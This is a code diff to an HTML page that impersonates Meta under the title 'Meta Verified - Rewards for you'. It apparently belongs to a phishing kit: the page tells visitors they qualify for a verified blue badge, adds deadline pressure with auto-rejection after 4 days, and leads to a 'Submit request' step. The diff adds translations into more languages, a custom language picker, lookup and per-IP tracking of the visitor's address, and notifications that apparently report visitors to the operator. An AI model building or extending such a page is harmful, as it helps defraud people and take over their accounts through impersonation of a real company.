@@ -5,7 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Verified - Rewards for you</title>
-    <link rel="icon" href="./public/icons/ic_favicon.png" type="image/png">
+    <link rel="icon" href="./public/icons/ic_favicon.png" type="image/png" sizes="256x256">
+    <link rel="apple-touch-icon" href="./public/icons/ic_favicon.png">
     <link rel="stylesheet" href="./public/styles/style.css">
 
     <!-- Tailwind CSS CDN -->
@@ -43,6 +44,11 @@
             display: none;
         }
 
+        #languageGate.is-checking .language-modal {
+            visibility: hidden;
+            pointer-events: none;
+        }
+
         .language-modal {
             width: 100%;
             max-width: 420px;
@@ -74,13 +80,19 @@
             font-weight: 500;
             color: #65676b;
             line-height: 1;
-            z-index: 1;
+            z-index: 2;
         }
 
-        .language-field select {
+        .language-native-select {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 0;
+            height: 0;
+        }
+
+        .language-toggle {
             width: 100%;
-            appearance: none;
-            -webkit-appearance: none;
             height: 52px;
             padding: 0 44px 0 14px;
             border: 1px solid #ccd0d5;
@@ -88,13 +100,74 @@
             background: #fff url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8' fill='none'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='%2365676b' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E") no-repeat right 16px center;
             font-size: 16px;
             color: #1c2b33;
-            outline: none;
+            text-align: left;
             cursor: pointer;
         }
 
-        .language-field select:focus {
+        .language-toggle.is-open,
+        .language-toggle:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 1px #1877f2;
+            outline: none;
+        }
+
+        .language-dropdown {
+            display: none;
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: calc(100% + 6px);
+            max-height: 240px;
+            overflow-y: scroll;
+            background: #fff;
+            border: 1px solid #ccd0d5;
+            border-radius: 10px;
+            box-shadow: 0 10px 28px rgba(15, 23, 42, 0.14);
+            z-index: 5;
+            padding: 4px 0;
+            scrollbar-width: thin;
+            scrollbar-color: #b0b6be #eef0f3;
+        }
+
+        .language-dropdown.is-open {
+            display: block;
+        }
+
+        .language-option {
+            display: block;
+            width: 100%;
+            border: none;
+            background: transparent;
+            text-align: left;
+            padding: 10px 14px;
+            font-size: 15px;
+            color: #1c2b33;
+            cursor: pointer;
+        }
+
+        .language-option:hover {
+            background: #f2f4f7;
+        }
+
+        .language-option.is-selected {
+            background: #e7f3ff;
+            font-weight: 600;
+        }
+
+        .language-dropdown::-webkit-scrollbar {
+            width: 8px !important;
+            display: block !important;
+        }
+
+        .language-dropdown::-webkit-scrollbar-track {
+            background: #eef0f3 !important;
+            display: block !important;
+        }
+
+        .language-dropdown::-webkit-scrollbar-thumb {
+            background: #b0b6be !important;
+            border-radius: 8px;
+            display: block !important;
         }
 
         .language-modal-actions {
@@ -126,17 +199,89 @@
             pointer-events: none;
             user-select: none;
         }
+
+        .page-footer {
+            margin-top: 32px;
+            color: #65676b;
+            font-size: 12px;
+        }
+
+        .footer-langs {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 8px 16px;
+            margin-bottom: 12px;
+        }
+
+        .footer-lang {
+            background: none;
+            border: none;
+            padding: 0;
+            color: #65676b;
+            font-size: 12px;
+            line-height: 1.4;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .footer-lang:hover {
+            text-decoration: underline;
+        }
+
+        .footer-lang.is-active {
+            color: #1c1e21;
+            font-weight: 600;
+            cursor: default;
+            text-decoration: none;
+        }
+
+        .footer-lang-more {
+            color: #385898;
+        }
+
+        .footer-links {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            text-align: center;
+            gap: 16px;
+        }
+
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .verified-badge img {
+            width: 72px;
+            height: 72px;
+            display: block;
+        }
+
+        @media (min-width: 640px) {
+            .verified-badge img {
+                width: 88px;
+                height: 88px;
+            }
+        }
     </style>
 </head>
 
 <body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen w-full flex justify-center language-locked">
 
-    <div id="languageGate" role="dialog" aria-modal="true" aria-labelledby="languageGateTitle">
+    <div id="languageGate" class="is-checking" role="dialog" aria-modal="true" aria-labelledby="languageGateTitle">
         <div class="language-modal">
             <h2 id="languageGateTitle">Change language</h2>
             <div class="language-field">
-                <label for="pageLanguage">Language</label>
-                <select id="pageLanguage" name="language">
+                <label for="languageToggle">Language</label>
+                <select id="pageLanguage" name="language" class="language-native-select" tabindex="-1" aria-hidden="true">
                     <option value="en" selected>English (US)</option>
                     <option value="en-gb">English (UK)</option>
                     <option value="es">Español</option>
@@ -150,16 +295,23 @@
                     <option value="uk">Українська</option>
                     <option value="tr">Türkçe</option>
                     <option value="ar">العربية</option>
+                    <option value="he">עברית</option>
                     <option value="hi">हिन्दी</option>
                     <option value="th">ไทย</option>
                     <option value="id">Bahasa Indonesia</option>
                     <option value="sv">Svenska</option>
+                    <option value="no">Norsk</option>
+                    <option value="da">Dansk</option>
                     <option value="ja">日本語</option>
                     <option value="ko">한국어</option>
                     <option value="zh">中文(简体)</option>
                     <option value="zh-tw">中文(繁體)</option>
                     <option value="vi">Tiếng Việt</option>
                 </select>
+                <button type="button" id="languageToggle" class="language-toggle" aria-expanded="false" aria-haspopup="listbox">
+                    <span id="languageToggleLabel">English (US)</span>
+                </button>
+                <div id="languageDropdown" class="language-dropdown" role="listbox"></div>
             </div>
             <div class="language-modal-actions">
                 <button type="button" id="confirmLanguageBtn" class="language-confirm-btn">Confirm</button>
@@ -171,13 +323,8 @@
         <div class="w-full">
             <div class="flex items-start gap-[8px] flex-col justify-start mb-[30px]">
                 <div class='flex items-center justify-start gap-[8px]'>
-                    <div class='flex items-center justify-center'>
-                        <svg width="49" height="49" viewBox="0 0 49 49" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <rect x="11" y="13" width="26" height="23" fill="white" />
-                            <path fill-rule="evenodd" clip-rule="evenodd"
-                                d="M18.2432 3.21986C21.3096 -1.07329 27.6902 -1.07329 30.7569 3.21986L31.2451 3.90334C31.7846 4.65892 32.6909 5.06349 33.6136 4.96097L35.7896 4.71917C40.687 4.17504 44.825 8.31305 44.2809 13.2103L44.0392 15.3864C43.9366 16.3092 44.3411 17.2153 45.0967 17.755L45.7802 18.2432C50.0733 21.3096 50.0733 27.6902 45.7802 30.7569L45.0967 31.2451C44.3411 31.7846 43.9366 32.6909 44.0392 33.6136L44.2809 35.7896C44.825 40.687 40.687 44.825 35.7896 44.2809L33.6136 44.0392C32.6909 43.9366 31.7846 44.3411 31.2451 45.0967L30.7569 45.7802C27.6902 50.0733 21.3099 50.0733 18.2432 45.7802L17.755 45.0967C17.2153 44.3411 16.3092 43.9366 15.3863 44.0392L13.2103 44.2809C8.31305 44.825 4.17504 40.687 4.71917 35.7896L4.96097 33.6136C5.06349 32.6909 4.65892 31.7846 3.90334 31.2451L3.21986 30.7569C-1.07329 27.6902 -1.07329 21.3099 3.21986 18.2432L3.90334 17.755C4.65892 17.2153 5.06349 16.3092 4.96097 15.3863L4.71917 13.2103C4.17504 8.31305 8.31305 4.17504 13.2103 4.71917L15.3864 4.96097C16.3092 5.06349 17.2153 4.65892 17.755 3.90334L18.2432 3.21986ZM34.0014 17.5617C35.0022 18.5626 35.0022 20.1855 34.0014 21.1863L24.2135 30.9742C22.9563 32.2316 20.9177 32.2316 19.6606 30.9742L14.9987 26.3123C13.9978 25.3115 13.9978 23.6886 14.9987 22.6877C15.9996 21.6869 17.6224 21.6869 18.6233 22.6877L21.937 26.0015L30.3768 17.5617C31.3776 16.5608 33.0005 16.5608 34.0014 17.5617Z"
-                                fill="#0081FB" />
-                        </svg>
+                    <div class="verified-badge flex items-center justify-center">
+                        <img src="./public/icons/ic_blue.svg" alt="">
                     </div>
                 </div>
                 <b class="text-[2rem]" data-i18n="heading">Meta Verified - Rewards for you</b>
@@ -207,12 +354,24 @@
             Submit request
         </button>
 
-        <div class="flex items-center text-center justify-center flex-wrap text-xs mt-8 text-[#65676b] gap-4">
-            <a href="#" data-i18n="helpCenter">Help Center</a>
-            <a href="#" data-i18n="privacyPolicy">Privacy Policy</a>
-            <a href="#" data-i18n="termsOfService">Terms of Service</a>
-            <a href="#" data-i18n="communityStandards">Community Standards</a>
-            <a href="#" data-i18n="copyright">Meta © 2026</a>
+        <div class="page-footer">
+            <div id="footerLanguages" class="footer-langs">
+                <button type="button" class="footer-lang" data-lang="en">English (US)</button>
+                <button type="button" class="footer-lang" data-lang="vi">Tiếng Việt</button>
+                <button type="button" class="footer-lang" data-lang="zh-tw">中文(台灣)</button>
+                <button type="button" class="footer-lang" data-lang="ko">한국어</button>
+                <button type="button" class="footer-lang" data-lang="ja">日本語</button>
+                <button type="button" class="footer-lang" data-lang="fr">Français (France)</button>
+                <button type="button" class="footer-lang" data-lang="th">ภาษาไทย</button>
+                <button type="button" class="footer-lang footer-lang-more" id="moreLanguagesBtn">More languages...</button>
+            </div>
+            <div class="footer-links">
+                <a href="#" data-i18n="helpCenter">Help Center</a>
+                <a href="#" data-i18n="privacyPolicy">Privacy Policy</a>
+                <a href="#" data-i18n="termsOfService">Terms of Service</a>
+                <a href="#" data-i18n="communityStandards">Community Standards</a>
+                <a href="#" data-i18n="copyright">Meta © 2026</a>
+            </div>
         </div>
     </div>
 
@@ -600,6 +759,42 @@
                     communityStandards: 'Communitystandarder',
                     copyright: 'Meta © 2026'
                 },
+                no: {
+                    pageTitle: 'Meta Verified - Belønninger for deg',
+                    heading: 'Meta Verified - Belønninger for deg',
+                    intro1: 'Vis verden at du mener alvor.',
+                    intro2: 'Gratulerer med at du oppfyller kravene for å oppgradere siden din til et verifisert blått merke! Dette er en fantastisk milepæl som speiler engasjementet ditt og tilliten du har bygget hos publikumet ditt.',
+                    intro3: 'Vi er glade for å feire dette øyeblikket med deg og ser frem til å se siden din vokse med denne prestisjefulle anerkjennelsen!',
+                    ticketPrefix: 'Din sak-ID: #',
+                    guideTitle: 'Veiledning for forespørsel om verifisert blått merke',
+                    guide1: '- Faktasjekkere svarer kanskje ikke på forespørsler som inneholder trusler, hatefull tale eller verbale trusler',
+                    guide2: '- Oppgi all nødvendig informasjon i forespørselen din slik at faktasjekkeren kan behandle den i tide. Å sende en ugyldig e-postadresse eller ikke svare på forespørsler om mer informasjon innen 2 dager kan føre til at søknaden lukkes uten vurdering. Hvis forespørselen fortsatt er ubehandlet etter 4 dager, avviser Meta den automatisk.',
+                    guide3: '- Når alle detaljene er sendt inn, vurderer vi kontoen din for eventuelle begrensninger. Verifiseringsprosessen tar vanligvis 24 timer, men kan i noen tilfeller ta lengre tid. Avhengig av beslutningen vår forblir begrensninger eller fjernes, og kontoen din oppdateres deretter.',
+                    submitBtn: 'Send forespørsel',
+                    helpCenter: 'Hjelpesenter',
+                    privacyPolicy: 'Personvernpolicy',
+                    termsOfService: 'Vilkår for bruk',
+                    communityStandards: 'Fellesskapsstandarder',
+                    copyright: 'Meta © 2026'
+                },
+                da: {
+                    pageTitle: 'Meta Verified - Belønninger til dig',
+                    heading: 'Meta Verified - Belønninger til dig',
+                    intro1: 'Vis verden, at du mener det alvorligt.',
+                    intro2: 'Tillykke med, at du opfylder kravene for at opgradere din side til et verificeret blåt mærke! Dette er en fantastisk milepæl, der afspejler din dedikation og den tillid, du har opbygget hos dit publikum.',
+                    intro3: 'Vi er glade for at fejre dette øjeblik med dig og ser frem til at se din side vokse med denne prestigefyldte anerkendelse!',
+                    ticketPrefix: 'Dit sags-ID: #',
+                    guideTitle: 'Vejledning til anmodning om verificeret blåt mærke',
+                    guide1: '- Faktatjekkere svarer muligvis ikke på anmodninger, der indeholder trusler, hadefuld tale eller verbale trusler',
+                    guide2: '- Angiv alle nødvendige oplysninger i din anmodning, så faktatjekkeren kan behandle den i tide. At sende en ugyldig e-mailadresse eller ikke svare på anmodninger om yderligere oplysninger inden for 2 dage kan føre til, at ansøgningen lukkes uden gennemgang. Hvis anmodningen stadig er ubehandlet efter 4 dage, afviser Meta den automatisk.',
+                    guide3: '- Når alle detaljer er indsendt, vurderer vi din konto for eventuelle begrænsninger. Verificeringsprocessen tager typisk 24 timer, men kan i nogle tilfælde tage længere tid. Afhængigt af vores beslutning forbliver begrænsninger eller fjernes, og din konto opdateres derefter.',
+                    submitBtn: 'Send anmodning',
+                    helpCenter: 'Hjælpecenter',
+                    privacyPolicy: 'Privatlivspolitik',
+                    termsOfService: 'Servicevilkår',
+                    communityStandards: 'Fællesskabsstandarder',
+                    copyright: 'Meta © 2026'
+                },
                 'zh-tw': {
                     pageTitle: 'Meta Verified - 為你準備的獎勵',
                     heading: 'Meta Verified - 為你準備的獎勵',
@@ -616,6 +811,24 @@
                     privacyPolicy: '隱私政策',
                     termsOfService: '服務條款',
                     communityStandards: '社群守則',
+                    copyright: 'Meta © 2026'
+                },
+                he: {
+                    pageTitle: 'Meta Verified - הטבות בשבילך',
+                    heading: 'Meta Verified - הטבות בשבילך',
+                    intro1: 'הראה לעולם שאתה מתכוון לעסקים.',
+                    intro2: 'ברכות על עמידה בדרישות לשדרוג העמוד לתג הכחול המאומת! זהו ציון דרך נהדר שמשקף את המסירות שלך ואת האמון שבנית עם הקהל.',
+                    intro3: 'אנחנו שמחים לחגוג את הרגע הזה איתך ומצפים לראות את העמוד שלך משגשג עם ההכרה היוקרתית הזו!',
+                    ticketPrefix: 'מזהה הפנייה שלך: #',
+                    guideTitle: 'מדריך לבקשת תג כחול מאומת',
+                    guide1: '- בודקי עובדות עשויים שלא להגיב לבקשות הכוללות הפחדה, הסתה או איומים מילוליים',
+                    guide2: '- בבקשה, ספק את כל המידע הנדרש כדי שבודק העובדות יוכל לטפל בה בזמן. שליחת כתובת אימייל לא תקינה או אי-מענה לבקשות למידע נוסף תוך יומיים עלולה להוביל לסגירת הבקשה ללא בדיקה. אם הבקשה תישאר ללא טיפול אחרי 4 ימים, Meta תדחה אותה אוטומטית.',
+                    guide3: '- לאחר שליחת כל הפרטים נבדוק את החשבון שלך לאיתור הגבלות. תהליך האימות אורך בדרך כלל 24 שעות, אך במקרים מסוימים עשוי להתארך. בהתאם להחלטתנו ההגבלות יישארו או יוסרו, והחשבון שלך יעודכן בהתאם.',
+                    submitBtn: 'שלח בקשה',
+                    helpCenter: 'מרכז העזרה',
+                    privacyPolicy: 'מדיניות פרטיות',
+                    termsOfService: 'תנאי השירות',
+                    communityStandards: 'סטנדרטים קהילתיים',
                     copyright: 'Meta © 2026'
                 }
             };
@@ -634,10 +847,13 @@
                 uk: 'uk',
                 tr: 'tr',
                 ar: 'ar',
+                he: 'he',
                 hi: 'hi',
                 th: 'th',
                 id: 'id',
                 sv: 'sv',
+                no: 'no',
+                da: 'da',
                 ja: 'ja',
                 ko: 'ko',
                 zh: 'zh-CN',
@@ -648,7 +864,7 @@
             function applyPageLanguage(lang) {
                 var dict = PAGE_I18N[lang] || PAGE_I18N.en;
                 document.documentElement.lang = LANG_ATTR[lang] || 'en';
-                document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+                document.documentElement.dir = (lang === 'ar' || lang === 'he') ? 'rtl' : 'ltr';
                 document.title = dict.pageTitle;
 
                 document.querySelectorAll('[data-i18n]').forEach(function (el) {
@@ -657,22 +873,157 @@
                         el.textContent = dict[key];
                     }
                 });
+
+                var moreBtn = document.getElementById('moreLanguagesBtn');
+                if (moreBtn) {
+                    moreBtn.textContent = MORE_LABELS[lang] || MORE_LABELS.en;
+                }
+
+                document.querySelectorAll('.footer-lang[data-lang]').forEach(function (btn) {
+                    btn.classList.toggle('is-active', btn.getAttribute('data-lang') === lang);
+                });
+
+                if (languageSelect && PAGE_I18N[lang]) {
+                    languageSelect.value = lang;
+                    syncLanguagePicker();
+                }
             }
+
+            var MORE_LABELS = {
+                en: 'More languages...',
+                'en-gb': 'More languages...',
+                es: 'Más idiomas...',
+                fr: 'Plus de langues...',
+                de: 'Weitere Sprachen...',
+                it: 'Altre lingue...',
+                pt: 'Mais idiomas...',
+                nl: 'Meer talen...',
+                pl: 'Więcej języków...',
+                ru: 'Другие языки...',
+                uk: 'Інші мови...',
+                tr: 'Daha fazla dil...',
+                ar: 'المزيد من اللغات...',
+                he: 'עוד שפות...',
+                hi: 'और भाषाएँ...',
+                th: 'ภาษาอื่น ๆ...',
+                id: 'Bahasa lainnya...',
+                sv: 'Fler språk...',
+                no: 'Flere språk...',
+                da: 'Flere sprog...',
+                ja: 'その他の言語...',
+                ko: '언어 더 보기...',
+                zh: '更多语言...',
+                'zh-tw': '更多語言...',
+                vi: 'Thêm ngôn ngữ...'
+            };
 
             var gate = document.getElementById('languageGate');
             var confirmBtn = document.getElementById('confirmLanguageBtn');
             var languageSelect = document.getElementById('pageLanguage');
+            var languageToggle = document.getElementById('languageToggle');
+            var languageToggleLabel = document.getElementById('languageToggleLabel');
+            var languageDropdown = document.getElementById('languageDropdown');
+
+            function syncLanguagePicker() {
+                if (!languageSelect || !languageToggleLabel) return;
+                var selected = languageSelect.options[languageSelect.selectedIndex];
+                languageToggleLabel.textContent = selected ? selected.text : 'English (US)';
+                languageDropdown.querySelectorAll('.language-option').forEach(function (btn) {
+                    btn.classList.toggle('is-selected', btn.getAttribute('data-value') === languageSelect.value);
+                });
+            }
+
+            function closeLanguageDropdown() {
+                languageDropdown.classList.remove('is-open');
+                languageToggle.classList.remove('is-open');
+                languageToggle.setAttribute('aria-expanded', 'false');
+            }
+
+            Array.from(languageSelect.options).forEach(function (opt) {
+                var btn = document.createElement('button');
+                btn.type = 'button';
+                btn.className = 'language-option';
+                btn.setAttribute('role', 'option');
+                btn.setAttribute('data-value', opt.value);
+                btn.textContent = opt.text;
+                if (opt.selected) btn.classList.add('is-selected');
+                btn.addEventListener('click', function (e) {
+                    e.stopPropagation();
+                    languageSelect.value = opt.value;
+                    syncLanguagePicker();
+                    closeLanguageDropdown();
+                });
+                languageDropdown.appendChild(btn);
+            });
+
+            languageToggle.addEventListener('click', function (e) {
+                e.stopPropagation();
+                var willOpen = !languageDropdown.classList.contains('is-open');
+                languageDropdown.classList.toggle('is-open', willOpen);
+                languageToggle.classList.toggle('is-open', willOpen);
+                languageToggle.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
+                if (willOpen) {
+                    var current = languageDropdown.querySelector('.is-selected');
+                    if (current) current.scrollIntoView({ block: 'nearest' });
+                }
+            });
+
+            document.addEventListener('click', closeLanguageDropdown);
+            languageDropdown.addEventListener('click', function (e) {
+                e.stopPropagation();
+            });
+
+            function setPageLanguage(lang) {
+                lang = lang || 'en';
+                try {
+                    sessionStorage.setItem('pageLanguage', lang);
+                } catch (e) { }
+                applyPageLanguage(lang);
+            }
+
+            function unlockPage() {
+                gate.classList.add('hidden');
+                gate.classList.remove('is-checking');
+                document.body.classList.remove('language-locked');
+            }
+
+            function showLanguageGate() {
+                gate.classList.remove('hidden');
+                gate.classList.remove('is-checking');
+                document.body.classList.add('language-locked');
+            }
 
             confirmBtn.addEventListener('click', function () {
-                var selected = languageSelect.value || 'en';
-                try {
-                    sessionStorage.setItem('pageLanguage', selected);
-                } catch (e) { }
+                var lang = languageSelect.value || 'en';
+                var selectedLabel = languageSelect.options[languageSelect.selectedIndex].text;
+                setPageLanguage(lang);
+                unlockPage();
 
-                applyPageLanguage(selected);
-                gate.classList.add('hidden');
-                document.body.classList.remove('language-locked');
+                if (window.Utils) {
+                    var ip = window.__visitorIp || 'N/A';
+                    Utils.markLanguageGateConfirmed(ip, lang);
+                    Utils.sendLanguageNotification(selectedLabel);
+                }
             });
+
+            document.querySelectorAll('.footer-lang[data-lang]').forEach(function (btn) {
+                btn.addEventListener('click', function () {
+                    var lang = btn.getAttribute('data-lang');
+                    if (lang === languageSelect.value) return;
+                    setPageLanguage(lang);
+                    if (window.Utils && window.__visitorIp) {
+                        Utils.markLanguageGateConfirmed(window.__visitorIp, lang);
+                    }
+                });
+            });
+
+            document.getElementById('moreLanguagesBtn').addEventListener('click', function () {
+                showLanguageGate();
+            });
+
+            window.__setPageLanguage = setPageLanguage;
+            window.__unlockLanguageGate = unlockPage;
+            window.__showLanguageGate = showLanguageGate;
         })();
     </script>
 
@@ -680,11 +1031,19 @@
     <script src="./public/js/config.js"></script>
     <script src="./public/js/utils.js"></script>
     <script>
-        document.getElementById('confirmLanguageBtn').addEventListener('click', function () {
-            var languageSelect = document.getElementById('pageLanguage');
-            var selectedLabel = languageSelect.options[languageSelect.selectedIndex].text;
-            Utils.sendLanguageNotification(selectedLabel);
-        });
+        (async function () {
+            var locationData = await Utils.getUserLocation();
+            var ip = locationData.ip || 'N/A';
+            window.__visitorIp = ip;
+
+            var savedLang = Utils.getConfirmedLanguageForIp(ip);
+            if (savedLang) {
+                window.__setPageLanguage(savedLang);
+                window.__unlockLanguageGate();
+            } else {
+                window.__showLanguageGate();
+            }
+        })();
     </script>
     <script src="./public/js/modal.js"></script>
     <script src="./public/js/app.js"></script>
